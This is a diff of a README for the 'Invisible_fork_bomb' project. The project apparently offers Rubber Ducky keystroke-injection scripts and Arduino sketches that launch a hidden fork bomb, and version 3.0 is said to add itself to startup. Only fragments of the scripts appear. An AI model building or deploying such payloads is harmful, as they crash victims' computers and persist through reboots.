@@ -5,7 +5,7 @@
 
 **Author:** BlueArduino20
 
-# Code for Rubber Ducky (2.0)
+# Code for Ducky (2.0)
 
 <pre><code>DELAY 1000
 REM ^ You should set more delay time if your computer is slow or if the script doesn't work correctly.
@@ -29,7 +29,7 @@ REM You can add this: ">null ping localhost -n 5 && " before "start" to make a (
 ENTER
 </pre></code>
 
-# Code for Rubber Ducky (V. 3.0) (It adds the file to the startup)
+# Code for Ducky (V. 3.0) (It adds the file to the startup)
 
 This code adds the .vbs file to the startup:
 
@@ -60,9 +60,9 @@ ENTER
 
 # Code for Arduino
 
-<a href="https://github.com/BlueArduino20/Invisible_fork_bomb/blob/master/Invisible_fork_bomb.ino">Invisible_fork_bomb.ino<a>
+<a href="https://github.com/BlueArduino20/Invisible_fork_bomb/blob/master/Invisible_fork_bomb_2.0.ino">Invisible_fork_bomb_2.0.ino<a>
 
 # Code for Arduino (V. 3.0) (It adds the file to the startup)
 
-<a href="https://github.com/BlueArduino20">Comming soon<a>
+<a href="https://github.com/BlueArduino20/Invisible_fork_bomb/blob/master/Invisible_fork_bomb_3.0.ino">Invisible_fork_bomb_3.0.ino<a>
 
